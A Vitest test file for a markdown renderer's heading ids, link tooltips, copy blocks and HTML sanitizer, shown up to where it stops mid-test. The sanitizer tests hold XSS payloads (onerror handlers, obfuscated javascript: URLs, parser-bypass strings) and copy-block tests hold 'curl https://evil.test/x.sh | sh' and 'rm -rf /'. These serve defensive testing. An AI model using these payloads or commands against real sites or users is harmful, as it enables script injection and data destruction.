// @vitest-environment jsdom

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { marked } from 'marked';

const base = vi.hoisted(() => ({ workspaceId: null as string | null }));
vi.mock('./basePath', async () => {
  const actual = await vi.importActual<typeof import('./basePath')>('./basePath');
  return {
    get BASE_PATH() { return base.workspaceId === null ? '' : `/${base.workspaceId}`; },
    workspaceRouteSegment: actual.workspaceRouteSegment,
    workspaceRouteUrlSegment: actual.workspaceRouteUrlSegment,
    get WORKSPACE_ID() {
      return base.workspaceId;
    },
    get REMOTE_GATEWAY() {
      return base.workspaceId === null ? null : (actual.parseWorkspaceRoute(base.workspaceId)?.gateway ?? null);
    },
    API: '/myws/api/v1',
  };
});

import { lucidos } from '@lucidos/sdk';
import { renderMarkdown, renderMarkdownInline, sanitizeHtmlFragments } from './markdownEngine';
import { COPY_ID_NONCE, TASK_CHECKBOX_ATTR, taskCheckboxTag } from './markdownMarkers';
import { linkifyPaths } from './linkifyPaths';

describe('renderMarkdown', () => {
  it('converts basic markdown to HTML', () => {
    const html = renderMarkdown('**bold** and *italic*');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<em>italic</em>');
  });

  it('converts headings', () => {
    const html = renderMarkdown('# Heading 1\n## Heading 2');
    expect(html).toContain('<h1');
    expect(html).toContain('Heading 1');
    expect(html).toContain('<h2');
    expect(html).toContain('Heading 2');
  });

  it('gives no heading an id in chat, where messages would repeat them', () => {
    expect(renderMarkdown('## Usage', { cache: false })).not.toContain('id=');
  });

  it('gives a document heading the anchor id GitHub gives it', () => {
    const doc = { kind: 'repo', repoId: 'repo-1', path: 'docs/guide.md' } as const;
    const html = renderMarkdown(
      '## Auth tier compatibility (API key vs subscription / OAuth)',
      { cache: false, document: doc },
    );
    expect(html).toContain('id="user-content-auth-tier-compatibility-api-key-vs-subscription--oauth"');
  });

  it('numbers a repeated document heading, and keeps an authored id', () => {
    const doc = { kind: 'workspace', path: 'artifacts/notes.md' } as const;
    const html = renderMarkdown(
      '## Usage\n\n## Usage\n\n<h3 id="mine">Usage</h3>\n\n## 🚀',
      { cache: false, document: doc },
    );
    expect(html).toContain('id="user-content-usage"');
    expect(html).toContain('id="user-content-usage-1"');
    expect(html).toContain('<h3 id="mine">');
    expect(html).toContain('<h2>🚀</h2>');
  });

  it('caches a document separately from the same text in chat', () => {
    const md = '## Cached heading';
    renderMarkdown(md);
    const doc = { kind: 'workspace', path: 'artifacts/notes.md' } as const;
    expect(renderMarkdown(md, { document: doc })).toContain('id="user-content-cached-heading"');
    expect(renderMarkdown(md)).not.toContain('id=');
  });

  describe('link tooltips', () => {
    it('stamps no tooltip in chat, which has no document to resolve against', () => {
      const html = renderMarkdown('[guide](../guide.md)', { cache: false });
      expect(html).not.toContain('data-tooltip');
    });

    it('stamps the resolved path on a relative link in a document, matching a click', () => {
      const doc = { kind: 'repo', repoId: 'repo-1', path: 'docs/databricks.md' } as const;
      const html = renderMarkdown(
        '[databricks guide](../deploy/databricks/README.md)',
        { cache: false, document: doc },
      );
      expect(html).toContain('data-tooltip="deploy/databricks/README.md"');
      expect(html).toContain('data-tooltip-longpress');
    });

    it("stamps a found heading's own text for an in-page anchor", () => {
      const doc = { kind: 'workspace', path: 'notes/plan.md' } as const;
      const md = '## Auth tier compatibility (API key vs subscription / OAuth)\n\n'
        + 'See [the section](#auth-tier-compatibility-api-key-vs-subscription--oauth).';
      const html = renderMarkdown(md, { cache: false, document: doc });
      expect(html).toContain(
        'data-tooltip="Auth tier compatibility (API key vs subscription / OAuth)"',
      );
    });

    it('matches the "No ... section" toast wording when no heading matches', () => {
      const doc = { kind: 'workspace', path: 'notes/plan.md' } as const;
      const html = renderMarkdown('[missing](#nope)', { cache: false, document: doc });
      expect(html).toContain('data-tooltip="No &quot;nope&quot; section in notes/plan.md"');
    });

    it('stamps the full URL on an external link', () => {
      const doc = { kind: 'workspace', path: 'notes/plan.md' } as const;
      const html = renderMarkdown(
        '[example](https://example.com/docs)',
        { cache: false, document: doc },
      );
      expect(html).toContain('data-tooltip="https://example.com/docs"');
    });

    it('marks a link climbing above the root as not reachable, without resolving it', () => {
      const doc = { kind: 'workspace', path: 'notes/plan.md' } as const;
      const html = renderMarkdown('[outside](../../outside.md)', { cache: false, document: doc });
      expect(html).toContain('data-tooltip="../../outside.md (not reachable)"');
    });

    it('moves an authored markdown title to data-tooltip-title, next to the resolved target', () => {
      const doc = { kind: 'repo', repoId: 'repo-1', path: 'docs/databricks.md' } as const;
      const html = renderMarkdown(
        '[guide](../deploy/databricks/README.md "The deploy guide")',
        { cache: false, document: doc },
      );
      expect(html).toContain('data-tooltip-title="The deploy guide"');
      expect(html).toContain('data-tooltip="deploy/databricks/README.md"');
      expect(html.replace('data-tooltip-title="The deploy guide"', '')).not.toContain('title="');
    });
  });

  it('converts soft breaks to hard breaks', () => {
    const html = renderMarkdown('line one\nline two');
    expect(html).toContain('<br');
  });

  it('converts lists', () => {
    const html = renderMarkdown('- item one\n- item two\n- item three');
    expect(html).toContain('<ul>');
    expect(html).toContain('<li>');
    expect(html).toContain('item one');
    expect(html).toContain('item two');
  });

  it('handles code blocks with copy button', () => {
    const html = renderMarkdown('```js\nconsole.log("hi")\n```');
    expect(html).toContain('<div class="code-block-wrapper" data-copy-code="">');
    expect(html).toContain('code-block-copy-btn');
    expect(html).toContain('<code>');
    expect(html).toContain('console.log');
  });

  it('shows language label on code blocks', () => {
    const html = renderMarkdown('```python\nprint("hi")\n```');
    expect(html).toContain('<span class="code-block-lang">python</span>');
  });

  it('escapes HTML in language label to prevent XSS', () => {
    const html = renderMarkdown('```js<script>alert(1)</script>\ncode\n```');
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
  });

  it('labels a code block with the first word of its info string', () => {
    const html = renderMarkdown('```js title="my file.js" lines=2\nx\n```');
    expect(html).toContain('<span class="code-block-lang">js</span>');
    expect(html).toContain('<pre><code>x</code></pre>');
  });

  it('labels a code block whose attributes sit in braces', () => {
    const html = renderMarkdown('```python {linenos=true hl_lines=[2]}\nx\n```');
    expect(html).toContain('<span class="code-block-lang">python</span>');
    expect(html).toContain('<pre><code>x</code></pre>');
  });

  it.each(['c++', 'c#', 'objective-c', 'shell-session', 'node.js'])('labels a code block in %s', (lang) => {
    expect(renderMarkdown('```' + lang + '\nx\n```')).toContain(`<span class="code-block-lang">${lang}</span>`);
  });

  it('renders text on the opening fence line as code, not as a label', () => {
    const html = renderMarkdown('Schema:\n```{"agent":"Mozilla/5.0 (Mac)","id":"<brand>"}\n```');
    expect(html).not.toContain('code-block-lang');
    expect(html).toContain('<pre><code>{"agent":"Mozilla/5.0 (Mac)","id":"&lt;brand&gt;"}</code></pre>');
  });

  it.each(['const x = 1', 'SELECT * FROM users', 'ls -la'])('renders %s on the opening fence line as code', (line) => {
    const html = renderMarkdown('```' + line + '\n```');
    expect(html).not.toContain('code-block-lang');
    expect(html).toContain(`<pre><code>${line}</code></pre>`);
  });

  it('reads a long attribute-like fence line in linear time', () => {
    const line = 'js' + ' a="b c=d"'.repeat(40) + ' !';
    expect(renderMarkdown('```' + line + '\n```')).not.toContain('code-block-lang');
  });

  it('keeps the backslashes in code on the opening fence line', () => {
    const html = renderMarkdown('```{"msg":"say \\"hi\\""}\n```');
    expect(html).toContain('<pre><code>{"msg":"say \\"hi\\""}</code></pre>');
  });

  it('keeps the lines under a fence line that carries code', () => {
    const html = renderMarkdown('```{\n  "a": 1\n}\n```');
    expect(html).not.toContain('code-block-lang');
    expect(html).toContain('<pre><code>{\n  "a": 1\n}</code></pre>');
  });

  it('renders code blocks without language', () => {
    const html = renderMarkdown('```\nsome code\n```');
    expect(html).toContain('code-block-wrapper');
    expect(html).toContain('code-block-copy-btn');
    expect(html).not.toContain('code-block-lang');
  });

  it('handles inline code', () => {
    const html = renderMarkdown('use `foo()` here');
    expect(html).toContain('<code>foo()</code>');
  });

  it('handles tables', () => {
    const md = '| Name | Value |\n| --- | --- |\n| A | 1 |';
    const html = renderMarkdown(md);
    expect(html).toContain('<div class="table-scroll-wrapper"><table>');
    expect(html).toContain('</table></div>');
    expect(html).toContain('<th>');
    expect(html).toContain('Name');
  });

  it('handles empty input', () => {
    expect(renderMarkdown('')).toBe('');
  });

  it('handles plain text without markdown', () => {
    const html = renderMarkdown('just plain text');
    expect(html).toContain('just plain text');
  });

  it('handles links', () => {
    const html = renderMarkdown('[link](https://example.com)');
    expect(html).toContain('<a href="https://example.com"');
    expect(html).toContain('link</a>');
  });

  describe('HTML sanitization', () => {
    it('escapes raw <iframe> in text instead of rendering it', () => {
      const html = renderMarkdown('Sandboxed <iframe> rendering');
      expect(html).not.toContain('<iframe>');
      expect(html).toContain('&lt;iframe&gt;');
    });

    it('escapes <script> tags', () => {
      const html = renderMarkdown('Try <script>alert(1)</script> here');
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
    });

    it('escapes <object> and <embed> tags', () => {
      const html = renderMarkdown('Use <object data="x"> and <embed src="y">');
      expect(html).not.toContain('<object');
      expect(html).not.toContain('<embed');
      expect(html).toContain('&lt;object');
      expect(html).toContain('&lt;embed');
    });

    it('does not affect HTML inside code blocks', () => {
      const html = renderMarkdown('```\n<iframe src="x"></iframe>\n```');
      expect(html).toContain('code-block-wrapper');
      expect(html).not.toContain('<iframe');
      expect(html).toContain('&lt;iframe');
    });

    it('escapes structural HTML tags inside code blocks so they render as text', () => {
      const md = '```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>X</title>\n  </head>\n  <body>hi</body>\n</html>\n```';
      const html = renderMarkdown(md);
      expect(html).not.toContain('<!DOCTYPE html>');
      expect(html).not.toContain('<html>');
      expect(html).not.toContain('<title>');
      expect(html).not.toContain('<body>');
      expect(html).toContain('&lt;!DOCTYPE html&gt;');
      expect(html).toContain('&lt;title&gt;X&lt;/title&gt;');
      expect(html).toContain('&lt;body&gt;hi&lt;/body&gt;');
    });

    it('preserves HTML inside inline code', () => {
      const html = renderMarkdown('use `<iframe>` element');
      expect(html).toContain('<code>&lt;iframe&gt;</code>');
    });

    it('strips event-handler attributes from raw HTML that marked preserves', () => {
      const html = renderMarkdown('<img src="x" onerror="alert(1)"> <span onClick=alert(2)>ok</span>');
      expect(html).toContain('<img src="x">');
      expect(html).toContain('<span>ok</span>');
      expect(html).not.toContain('onerror');
      expect(html).not.toContain('onClick');
      expect(html).not.toContain('alert(1)');
    });

    it('strips javascript and data URL attributes from raw HTML', () => {
      const html = renderMarkdown('<a href="javascript:alert(1)">x</a><img src=data:text/html,evil>');
      expect(html).toContain('<a>x</a>');
      expect(html).toContain('<img>');
      expect(html).not.toContain('javascript:');
      expect(html).not.toContain('data:text/html');
    });

    it('strips entity-obfuscated javascript and data URL attributes from raw HTML', () => {
      const html = renderMarkdown(
        '<a href="jav&#x61;script&colon;alert(1)">x</a><img src="da&#116;a:text/html,evil">',
      );
      expect(html).toContain('<a>x</a>');
      expect(html).toContain('<img>');
      expect(html).not.toContain('jav&#x61;script');
      expect(html).not.toContain('data:text/html');
      expect(html).not.toContain('alert(1)');
    });

    it('strips URL attributes with embedded control whitespace in dangerous schemes', () => {
      const html = renderMarkdown('<a href="java&#10;script:alert(1)">x</a><img src="da\tta:text/html,evil">');
      expect(html).toContain('<a>x</a>');
      expect(html).toContain('<img>');
      expect(html).not.toContain('java&#10;script');
      expect(html).not.toContain('data:text/html');
    });

    it('does not throw on out-of-range numeric character references in URL attributes', () => {
      expect(() => renderMarkdown('<a href="&#99999999;">x</a>')).not.toThrow();
    });

    it.each([
      ['Set online=yes in the config file.', 'Set online=yes in the config file.'],
      ['Use once=true to run it a single time.', 'Use once=true to run it a single time.'],
      ['Deploy with only=web and once=1.', 'Deploy with only=web and once=1.'],
      ['Values: on_error=retry, on_success=stop.', 'Values: on_error=retry, on_success=stop.'],
      ['The flag onboarding=disabled turns it off.', 'The flag onboarding=disabled turns it off.'],
    ])('keeps prose that merely looks like a handler attribute: %s', (src, kept) => {
      expect(renderMarkdown(src, { cache: false })).toContain(kept);
    });

    it('keeps an `on…=` run inside a copy block, so the copied text is intact', () => {
      const html = renderMarkdown('<copy>lucidos trigger set on_event=ThreadCompleted</copy>', { cache: false });
      expect(html).toContain('data-copy-text="lucidos trigger set on_event=ThreadCompleted"');
    });

    it('still strips a handler/href hidden behind a `>` inside an earlier attribute value', () => {
      const html = renderMarkdown(
        '<a title="a>b" href="javascript:alert(1)" onmouseover="alert(2)">x</a>',
        { cache: false },
      );
      expect(html).not.toContain('javascript:');
      expect(html).not.toContain('onmouseover');
      expect(html).not.toContain('alert(');
    });

    it('leaves an unterminated tag inert: marked escapes it to text', () => {
      const html = renderMarkdown('<a href="javascript:alert(1)" onclick="alert(2)"', { cache: false });
      expect(html).not.toContain('<a ');
      expect(html).toContain('&lt;a href="javascript:alert(1)"');
    });

    it('drops a handler attribute without leaving a double space behind', () => {
      expect(renderMarkdown('<span class="a" onclick="x" id="b">y</span>', { cache: false }))
        .toContain('<span class="a" id="b">y</span>');
    });

    it('keeps a bare boolean attribute and the attribute after it', () => {
      expect(renderMarkdown('<details open onfocus="x" title="v">d</details>', { cache: false }))
        .toContain('<details open="" title="v">');
    });

    it('keeps prose after an HTML comment containing an apostrophe', () => {
      const html = renderMarkdown("<!-- don't forget -->\n\nSet online=yes in the config.", { cache: false });
      expect(html).toContain('online=yes');
    });

    it('keeps prose after an unquoted attribute value containing an apostrophe', () => {
      const html = renderMarkdown("<h2 id=it's>T</h2>\n\nSet online=yes in the config.", { cache: false });
      expect(html).toContain('online=yes');
    });

    it('keeps inline prose after an inline HTML comment with an apostrophe', () => {
      const html = renderMarkdownInline("Inline <!-- don't --> then online=yes stays");
      expect(html).toContain('online=yes');
    });

    it.each([
      '<textarea><!--</textarea><img src=x onerror=alert(1)>',
      '<title><!--</title><img src=x onerror=alert(1)>',
      '<textarea rows=1><!--</textarea><a href="javascript:alert(1)">click</a>',
    ])('does not let an unterminated comment in RCDATA smuggle a handler: %s', (src) => {
      const html = renderMarkdown(src, { cache: false });
      expect(html).not.toMatch(/onerror/i);
      expect(html).not.toMatch(/javascript:/i);
    });

    it('still strips an unquoted handler attribute', () => {
      const html = renderMarkdown('<img src=x onerror=alert(1)>', { cache: false });
      expect(html).not.toContain('onerror');
      expect(html).not.toContain('alert(');
    });

    it.each([
      '<textarea><a title="</textarea><img src=x onerror="alert(1)">',
      "<title><a title='</title><img src=x onerror='alert(1)'>",
      '<textarea><a title="</textarea><a href="javascript:alert(1)">go</a>',
      'Here is a form:\n\n<textarea><!--<b c="</textarea><img src=x onerror=alert(1)>\n\nDone.',
    ])('keeps a raw-text element from smuggling a live element past the walk: %s', (src) => {
      const html = renderMarkdown(src, { cache: false });
      const after = html.slice(html.toLowerCase().lastIndexOf('</textarea>') + 1)
        + html.slice(html.toLowerCase().lastIndexOf('</title>') + 1);
      expect(after).not.toMatch(/<img[^>]*onerror/i);
      expect(after).not.toMatch(/<a[^>]*javascript:/i);
    });

    it('resumes scrubbing after a raw-text element closes', () => {
      const html = renderMarkdown('<textarea>x</textarea><img src=y onerror=alert(1)>', { cache: false });
      expect(html).not.toMatch(/onerror/i);
    });

    it('shows a textarea as text, and still scrubs the markup inside it', () => {
      const html = renderMarkdown('<textarea><b onclick="x">hi</b></textarea>', { cache: false });
      expect(html).toContain('&lt;textarea&gt;');
      expect(html).not.toMatch(/<textarea/i);
      expect(html).not.toMatch(/<b[^>]*onclick/i);
    });

    it.each(['xmp', 'plaintext', 'noscript', 'noembed', 'noframes'])(
      'shows a %s element as text instead of deleting its content',
      (tag) => {
        const html = renderMarkdown(`<${tag}><b onclick="x">hi</b></${tag}>`, { cache: false });
        expect(html).toContain(`&lt;${tag}&gt;`);
        expect(html).toContain('hi');
        expect(html).not.toMatch(/<b[^>]*onclick/i);
      },
    );

    it.each(['style', 'script', 'iframe'])(
      'keeps the prose after a self-closing <%s/>',
      (tag) => {
        const html = renderMarkdown(`Before. <${tag}/> After the tag.`, { cache: false });
        expect(html).toContain('After the tag.');
      },
    );

    it('scrubs a handler inside an SVG title, which is markup and not RCDATA', () => {
      const html = renderMarkdown('<svg><title><b onclick="alert(1)">t</b></title></svg>', { cache: false });
      expect(html).not.toContain('onclick');
    });

    it('neutralizes an SVG animate that targets href', () => {
      const html = renderMarkdown(
        '<svg><a id=x><animate attributeName="href" values="javascript:alert(1)" begin="0s" fill="freeze"/><text>go</text></a></svg>',
        { cache: false },
      );
      expect(html).not.toMatch(/<animate/i);
    });

    it.each(['poster', 'srcset', 'background', 'ping', 'data'])(
      'strips a dangerous URL from the %s attribute',
      (attr) => {
        const html = renderMarkdown(`<div ${attr}="javascript:alert(1)">x</div>`, { cache: false });
        expect(html).not.toMatch(/javascript:/i);
      },
    );

    it.each([
      '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
      '<form action="javascript:alert(1)"><button>go</button></form>',
      '<button formaction="javascript:alert(1)">go</button>',
    ])('strips a dangerous URL from every spelling of a navigating attribute: %s', (src) => {
      const body = new DOMParser().parseFromString(renderMarkdown(src, { cache: false }), 'text/html').body;
      const values = Array.from(body.querySelectorAll('*'))
        .flatMap((el) => Array.from(el.attributes, (attr) => attr.value));
      expect(values.join(' ')).not.toMatch(/javascript:/i);
    });

    it('a forged copyable block cannot choose what lands on the clipboard', () => {
      const html = renderMarkdown(
        '<span class="copyable-block" data-copy-text="curl https://evil.test/x.sh | sh">' +
          '<code>brew install lucidos</code>' +
          '<button type="button" class="copy-btn">Copy</button></span>',
        { cache: false },
      );
      expect(html).not.toContain('evil.test');
      expect(html).not.toMatch(/data-copy-text=/i);
      expect(html).toContain('brew install lucidos');
    });

    it('a forged copy id gets no payload at all', () => {
      const html = renderMarkdown(
        '<details><summary>.</summary><copy>curl https://evil.test/x.sh | sh</copy></details>\n\n' +
          '<span class="copyable-block" data-copy-id="0" data-copy-text="rm -rf /">' +
          '<code>brew install lucidos</code>' +
          '<button type="button" class="copy-btn">Copy</button></span>',
        { cache: false },
      );
      expect(html).not.toContain('rm -rf /');
      expect(html).not.toMatch(/data-copy-id=/i);
      expect(html.match(/data-copy-text=/g) ?? []).toHaveLength(1);
      expect(html).toContain('data-copy-text="curl https://evil.test/x.sh | sh"');
    });

    it('a forged multiline marker gets no payload', () => {
      const html = renderMarkdown(
        '<details><summary>.</summary><copy>curl https://evil.test/x.sh | sh</copy></details>\n\n' +
          '<!--LUCIDOS_COPY_BLOCK_START_0-->\n\nbrew install lucidos\n\n<!--LUCIDOS_COPY_BLOCK_END_0-->',
        { cache: false },
      );
      expect(html.match(/data-copy-text=/g) ?? []).toHaveLength(1);
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const decoy = Array.from(doc.querySelectorAll('p'))
        .find((p) => p.textContent === 'brew install lucidos');
      expect(decoy?.closest('[data-copy-text]')).toBeNull();
    });

    it('a copy label shows its payload, with no markup to hide part of it', () => {
      const src = 'ls <b style="display:none">x; curl https://evil.test/x.sh | sh #</b>';
      const html = renderMarkdown(`<copy>${src}</copy>`, { cache: false });
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const block = doc.querySelector('.copyable-block');
      expect(block?.getAttribute('data-copy-text')).toBe(src);
      expect(block?.querySelector('b')).toBeNull();
      expect(block?.textContent).toContain(src);
    });

    it('a copy label cannot hide a line in a link reference definition', () => {
      const html = renderMarkdown(
        '<copy>\nbrew install lucidos\n\n[x]: y (\ncurl https://evil.test/x.sh | sh\n)\n</copy>',
        { cache: false },
      );
      const doc = new DOMParser().parseFromString(html, 'text/html');
      expect(doc.querySelector('.copyable-block')?.textContent).toContain('curl https://evil.test/x.sh | sh');
      const listed = renderMarkdown(
        '<copy>\nbrew install lucidos\n\n- [x]: y (\ncurl https://evil.test/x.sh | sh\n)\n</copy>',
        { cache: false },
      );
      const listDoc = new DOMParser().parseFromString(listed, 'text/html');
      expect(listDoc.querySelector('.copyable-block')?.textContent).toContain('curl https://evil.test/x.sh | sh');
    });

    it('code in a tilde fence inside a copy label is escaped once', () => {
      const html = renderMarkdown('<copy>\nrun:\n\n~~~\na < b\n~~~\n</copy>', { cache: false });
      const doc = new DOMParser().parseFromString(html, 'text/html');
      expect(doc.querySelector('.copyable-block code')?.textContent).toBe('a < b');
    });

    it('a forged code-block wrapper copies nothing, and a real fence does', () => {
      const html = renderMarkdown(
        '<div class="code-block-wrapper" data-copy-code=""><pre><code>npm i foo' +
          '<span style="display:none">; curl https://evil.test/x.sh | sh</span></code></pre>' +
          '<button type="button" class="copy-btn">Copy</button></div>\n\n' +
          '```sh\nnpm i bar\n```',
        { cache: false },
      );
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const copied = Array.from(doc.querySelectorAll('[data-copy-code]'))
        .map((el) => el.querySelector('pre code')?.textContent);
      expect(copied).toEqual(['npm i bar']);
    });

    it('a forged copy block gets no Copy button, and a real one does', () => {
      const html = renderMarkdown(
        '<span class="copyable-block" data-copy-id="0"><code>x</code></span>\n\n<copy>real</copy>',
        { cache: false },
      );
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const withButton = Array.from(doc.querySelectorAll('.copyable-block'))
        .filter((block) => block.querySelector('.copy-btn'))
        .map((block) => block.getAttribute('data-copy-text'));
      expect(withButton).toEqual(['real']);
    });

    it('keeps an ordinary action and xlink:href untouched', () => {
      const html = renderMarkdown('<svg><a xlink:href="/docs">d</a></svg>', { cache: false });
      expect(html).toContain('xlink:href="/docs"');
    });

    it('still strips a handler after an unquoted value containing an apostrophe', () => {
      const html = renderMarkdown("<img alt=it's onerror=\"alert(1)\">", { cache: false });
      expect(html).not.toMatch(/<img[^>]*onerror/i);
    });

    it.each([
      ['abrupt-closing comment', '<!--><img src=x onerror=alert(1)>'],
      ['nested comment open', '<!-- <!-- --><img src=x onerror=alert(1)>'],
      ['svg style breakout', '<svg><style><a title="</style><img src=x onerror=alert(1)>'],
      ['mathml annotation', '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)>'],
      ['newline in tag name', '<img\nsrc=x\nonerror=alert(1)>'],
      ['nul byte in scheme', '<a href="java\u0000script:alert(1)">x</a>'],
    ])('closes the parser-disagreement bypass class: %s', (_name, src) => {
      const html = renderMarkdown(src, { cache: false });
      expect(html).not.toMatch(/<[a-z][^>]*\son[a-z]+\s*=/i);
      expect(html).not.toMatch(/<[a-z][^>]*javascript:/i);
    });

    it.each([
      '<img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%3C/svg%3E">',
      '<video poster="data:text/html,evil"></video>',
      '<audio src="data:text/html,evil"></audio>',
    ])('strips a data: URL that the sanitizer would otherwise allow: %s', (src) => {
      expect(renderMarkdown(src, { cache: false })).not.toMatch(/data:/i);
    });

    it.each([
      'file:///Users/me/dist/Lucidos.dmg',
      'repo:aa11aaaa-bbbb-cccc-dddd-eeeeffff0001:file:README.md',
      'app:habit-tracker',
      'trigger:aa11aaaa-bbbb-cccc-dddd-eeeeffff0002',
      'settings:backup',
    ])('keeps an app-owned scheme the extractors run on: %s', (href) => {
      expect(renderMarkdown(`[x](${href})`, { cache: false })).toContain(`href="${href}"`);
    });
  });

  describe('copy blocks', () => {
    it('renders inline copy block with wrapper and button', () => {
      const html = renderMarkdown('Call <copy>+1-555-0123</copy> for info');
      expect(html).toContain('class="copyable-block"');
      expect(html).toContain('data-copy-text="+1-555-0123"');
      expect(html).toContain('class="copy-btn"');
      expect(html).toContain('+1-555-0123');
    });

    it('renders multiline copy block with multi class', () => {
      const html = renderMarkdown('<copy>line one\nline two</copy>');
      expect(html).toContain('copyable-block-multi');
      expect(html).toContain('data-copy-text="line one\nline two"');
    });

    it('uses span for inline and div for multiline', () => {
      const inlineHtml = renderMarkdown('<copy>short</copy>');
      expect(inlineHtml).toContain('<span class="copyable-block"');

      const multiHtml = renderMarkdown('<copy>a\nb</copy>');
      expect(multiHtml).toContain('<div class="copyable-block copyable-block-multi"');
    });

    it('encodes special characters in data attribute', () => {
      const html = renderMarkdown('<copy>a & "b"</copy>');
      expect(html).toContain('data-copy-text="a &amp; &quot;b&quot;"');
    });

    it('renders markdown inside copy blocks', () => {
      const html = renderMarkdown('<copy>**bold** text</copy>');
      expect(html).toContain('<strong>bold</strong>');
    });

    it('renders large multiline copy block without breaking HTML structure', () => {
      const content = `Refactor panel overlay state from 6 independent signals into a single discriminated union.

Current state: currentSkill, currentComponent, previewFile, panelUrl, activeInlineForm, and viewingNotification are 6 separate signals in store/store.ts that represent mutually exclusive panel overlay state. They're checked in a priority chain in ContentPane.tsx and must be cleared together in switchMenuItem(). This design allows invalid states and has caused bugs (see commit 57eaf3d1 — overlay not clearing when activeMenuItem unchanged).

Target state: Replace with a single signal:

type PanelOverlay =
  | { type: 'form'; form: InlineForm }
  | { type: 'skill-ui'; skill: Skill; component: SkillUiComponent }
  | { type: 'file-preview'; path: string }
  | { type: 'url-preview'; url: string }
  | { type: 'notification-detail'; notification: Notification }
  | null;

Key files to change:
- store/store.ts — replace 6 signals with one panelOverlay signal
- store/actions/menu.ts — clearing becomes panelOverlay.value = null
- store/actions/navigation.ts — NavEntry stores one overlay value instead of 6 fields
- store/actions/skills.ts — openSkill(), openSkillUi(), closeSkillWindow() set/clear the union
- store/actions/artifacts.ts — openUrl(), file preview setters
- store/actions/notifications.ts — viewNotification()
- components/layout/ContentPane.tsx — replace priority chain with switch on overlay.type
- components/layout/AppHeader.tsx — reads overlay to determine header title
- ~25 files total touch these signals

Constraints:
- Write integration tests BEFORE refactoring
- Migrate the existing menu.test.ts tests to use the new union
- Navigation save/restore in localStorage must remain backward-compatible
- npm test and npx tsc --noEmit must pass with zero errors`;
      const html = renderMarkdown(`<copy>${content}</copy>`);

      expect(html).toContain('class="copy-btn"');
      expect(html).toContain('copyable-block-multi');

      const btnStart = html.indexOf('class="copy-btn"');
      const svgStart = html.indexOf('<svg');
      const btnEnd = html.indexOf('</button>');
      expect(btnStart).toBeGreaterThan(-1);
      expect(svgStart).toBeGreaterThan(btnStart);
      expect(btnEnd).toBeGreaterThan(svgStart);

      expect(html).toContain('Refactor panel overlay');
      expect(html).toContain('Key files to change');

      const svgCount = (html.match(/<svg/g) || []).length;
      const btnSvgCount = (html.match(/class="copy-btn"[^>]*>[\s]*<svg/g) || []).length;
      expect(svgCount).toBe(btnSvgCount);
    });

    it('multiline copy block with markdown headings and code fences survives marked', () => {
      const content = `# Advanced Prompt

Here is an example:

\`\`\`rust
fn main() {
    println!("hello");
}
\`\`\`

Use this pattern for all prompts.`;

      const html = renderMarkdown(`<copy>${content}</copy>`);

      expect(html).toContain('copyable-block-multi');

      const btnMatch = html.match(/<button[^>]*class="copy-btn"[^>]*>[\s\S]*?<\/button>/);
      expect(btnMatch).not.toBeNull();

      const wrapperStart = html.indexOf('copyable-block-multi');
      const btnPos = html.indexOf('class="copy-btn"');
      expect(wrapperStart).toBeGreaterThan(-1);
      expect(btnPos).toBeGreaterThan(wrapperStart);

      expect(html).toContain('<h1');
      expect(html).toContain('Advanced Prompt');
      expect(html).toContain('println!');

      expect(html).toContain('data-copy-text=');
    });

    it('does not match <copy> tags inside backtick code spans', () => {
      const html = renderMarkdown('I understand the `<copy>` syntax.\n\n<copy>actual content</copy>');

      expect(html).toContain('<code>&lt;copy&gt;</code>');

      expect(html).toContain('copyable-block');
      expect(html).toContain('actual content');

      expect(html).not.toMatch(/I understand the `<br/);
    });

    it('does not match <copy> tags inside fenced code blocks', () => {
      const html = renderMarkdown('```\n<copy>not real</copy>\n```\n\n<copy>real</copy>');

      const copyBlocks = html.match(/copyable-block/g);
      expect(copyBlocks).not.toBeNull();
      expect(copyBlocks!.length).toBe(1);

      expect(html).toContain('code-block-wrapper');
    });

    it.each(['`', '~'])('preserves literal paths inside a longer %s fence', (delimiter) => {
      const path = `/opt/${delimiter.repeat(3)}<copy>reports</copy>`;
      const fence = delimiter.repeat(4);
      const html = renderMarkdown(`${fence}\n${path}\n${fence}`);
      const doc = new DOMParser().parseFromString(html, 'text/html');

      expect(doc.querySelector('pre code')?.textContent?.trimEnd()).toBe(path);
    });

    it('preserves inline code backticks in data-copy-text', () => {
      const html = renderMarkdown('Currently, <copy>`getTextContent()` only returns text content.</copy>');
      expect(html).toContain('data-copy-text="`getTextContent()` only returns text content."');
      expect(html).not.toContain('CODE');
    });

    it('preserves inline code in multiline copy block data-copy-text', () => {
      const html = renderMarkdown('<copy>Run `npm install`\nthen `npm start`</copy>');
      expect(html).toContain('data-copy-text="Run `npm install`\nthen `npm start`"');
      expect(html).not.toContain('CODE');
    });

    it('handles multiple copy blocks in one message', () => {
      const html = renderMarkdown('ID: <copy>abc</copy> and <copy>xyz</copy>');
      const matches = html.match(/copyable-block/g);
      expect(matches!.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe('renderMarkdownInline (phrasing-content-only)', () => {
    it('renders inline tokens — bold, italic, code, breaks', () => {
      const html = renderMarkdownInline('**bold** *it* `code` line\nbreak');
      expect(html).toContain('<strong>bold</strong>');
      expect(html).toContain('<em>it</em>');
      expect(html).toContain('<code>code</code>');
      expect(html).toContain('<br');
    });

    it('does NOT emit block elements — paragraphs, lists, headings stay as literal text', () => {
      const html = renderMarkdownInline('# heading\n- item one\n- item two');
      expect(html).not.toContain('<p>');
      expect(html).not.toContain('<ul>');
      expect(html).not.toContain('<li>');
      expect(html).not.toContain('<h1');
      expect(html).toContain('# heading');
      expect(html).toContain('- item one');
      expect(html).toContain('- item two');
    });

    it('strips <a> from markdown links but keeps the label text', () => {
      const html = renderMarkdownInline('see [docs](https://example.com) for more');
      expect(html).not.toContain('<a ');
      expect(html).not.toContain('href');
      expect(html).toContain('see docs for more');
    });

